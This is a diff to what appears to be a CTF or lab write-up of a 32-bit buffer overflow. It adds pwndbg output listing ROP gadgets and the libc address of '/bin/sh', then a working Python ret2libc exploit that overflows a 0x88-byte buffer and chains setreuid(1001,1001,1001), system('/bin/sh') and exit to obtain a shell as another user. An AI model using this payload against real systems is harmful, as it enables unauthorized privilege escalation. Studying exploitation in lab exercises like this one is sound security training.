@@ -57,19 +57,39 @@ $3 = {void (int)} 0xf7db3460 <__GI_exit>
 pwndbg> search /bin/sh
 Searching for value: '/bin/sh'
 libc.so.6       0xf7f360d5 '/bin/sh'
+pwndbg> rop --grep "pop e.. ; pop e.. ; pop e.. ; ret" -- --depth 4
+Saved corefile /tmp/tmpwavgtsrz
+0xf7fdaf81 : pop ebp ; pop edi ; pop ebx ; ret
+0xf7fc4549 : pop ebp ; pop edx ; pop ecx ; ret
+0xf7fc5478 : pop ebx ; pop esi ; pop ebp ; ret
+0xf7fc70f0 : pop ebx ; pop esi ; pop edi ; ret
+0xf7fc45a2 : pop esi ; pop edi ; pop ebp ; ret
+0xf7fde6c0 : pop esi ; pop edi ; pop ebp ; ret 4
+0xf7fd7303 : pop esi ; pop edi ; pop ebp ; ret 8
 ```
 
-## Stack
-```
--88 buf
-...............
--00 saved ebp
-+04 setreuid // setuid(1001, 1001, 1001)
-+08 pop*3;ret
-+0c 1001
-+10 1001
-+14 1001
-+18 system // system("/bin/sh")
-+1c exit // exit(code)
-+20 "bin/sh" 
+## explot1.py
+```python
+#!/usr/bin/env python3
+from struct import pack
+import sys
+setreuid = 0xf7e91000
+system = 0xf7dc1170
+exit = 0xf7db3460
+binsh = 0xf7f360d5
+#0xf7fc70f0 : pop ebx ; pop esi ; pop edi ; ret
+pop3ret = 0xf7fc70f0
+payload = (
+    b'A'*(0x88+4) +
+    pack("<L", setreuid) + # setuid(1001, 1001, 1001)
+    pack("<L", pop3ret) +
+    pack("<L", 1001) +
+    pack("<L", 1001) +
+    pack("<L", 1001) +
+    pack("<L", system) + # system("/bin/sh")
+    pack("<L", exit) +  # exit(0x0101)
+    pack("<L", binsh) +
+    pack("<L", 0x0101)
+)
+sys.stdout.buffer.write(payload+b'\n')
 ```
